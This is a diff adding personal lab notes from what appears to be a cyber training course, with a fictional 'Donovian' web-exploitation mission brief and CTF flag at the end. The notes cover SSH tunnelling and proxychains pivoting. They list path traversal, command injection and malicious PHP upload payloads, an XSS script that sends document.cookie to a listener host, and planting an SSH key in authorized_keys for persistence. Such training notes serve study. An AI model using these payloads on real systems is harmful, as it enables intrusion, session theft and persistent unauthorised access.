@@ -1,0 +1,114 @@
+# Check Tunnel
+nc 127.0.0.1 42071
+
+# Create Master Socket
+ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
+ssh -S /tmp/demo demo1@10.50.12.21
+
+# Host Enumeration, Ping Sweep (from remote box)
+for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
+
+# Port Enumeration with dynamic and proxychains
+ssh -S /tmp/demo demo -O forward -D 9050
+ss -antlp | grep 9050 #sanity check, verify port opened
+proxychains nmap 10.208.50.42
+
+# Tunnel to...
+10.208.50.42
+22/tcp open ssh
+ssh -S /tmp/demo demo -O forward -L 42070:10.208.50.42:80
+ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
+
+80/tcp open http
+ssh -S /tmp/demo demo -O forward -L 42070:10.208.50.42:22
+ssh -MS /tmp/t1 www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+ssh -MS /tmp/t1 -i $HOME/.ssh/id_rsa www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+
+# HTTP enumeration, We would add notes to pages we find
+Check /robots.txt
+
+proxychains nmap --script+http-enum 10.208.50.42 80
+|    /robots.txt
+|    /java/
+|    /path/
+|    /uploads/
+
+# Directory Traversal takes advantage of READING files and using absolute path 
+../../../../../../etc/passwd
+../../../../../../etc/hosts
+
+127.0.0.1:42070/path/pathdemo.php?myfile=../../../../../../etch/passwd
+
+# CMD injection uses semi-colin to run commands (not an active shell cant cd)
+; whoami
+
+
+# JavaScript
+Open inspector
+find JS by looking for functions (
+open console in inspector and run js manually, e.g. changetext()
+
+
+# Steal Cookie
+setup nc
+nc -lvpk 10.50.187.52 42071 # Where you want to intercept cookie
+
+post to chat....
+<script>document.location="http://10.50.187.52:42071/?username=" + document.cookie;</script>
+
+127.0.0.1:42070/uploads
+# Malicious upload requires 1. Upload 2. Find uploads, 3. Call upload
+touch 503.png.php
+vim 503.png.php
+
+#### SSH KEYGEN #### important af
+Identify user and home directory using whoami and cat /etc/passwd
+
+# Generate Our Key
+## From Linops
+ssh-keygen -t rsa -b 4096 # enter for default option
+No passpharsse
+
+cat /home/student/.ssh/id_rsa.pub
+
+## On Target, make directory and verify
+; mkdir /var/www/.ssh
+; ls -la /var/www
+
+
+## On Traget, upload key and verify
+; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo
+; cat /var/www/.ssh/authorized_keys
+
+
+
+
+Donovian Web Exploitation (DWE)
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)
+
+Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.
+
+Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty
+
+Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.40
+
+Target Section:
+
+T1
+Hostname: Donovian_MI_websvr
+IP: 10.100.28.40
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.
